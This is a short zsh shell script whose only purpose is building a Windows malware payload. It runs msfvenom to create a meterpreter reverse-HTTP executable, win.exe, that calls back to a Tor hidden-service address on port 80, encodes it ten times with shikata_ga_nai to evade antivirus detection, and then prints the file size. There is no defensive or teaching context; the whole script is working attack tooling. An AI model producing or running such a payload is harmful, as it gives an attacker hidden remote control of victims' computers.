#!/bin/zsh

echo create Windows payload
msfvenom -p windows/meterpreter_reverse_http LHOST=oiobxkgezaqzt4jvqwsjxjhko6o23o4wvvgqcscekij2bhy3cjbzkzyd.onion.link LPORT=80 -o win.exe -f exe -e x86/shikata_ga_nai -i 10

payloadSize="$(du -sh win.exe)"
echo "Payload size: " $payloadSize
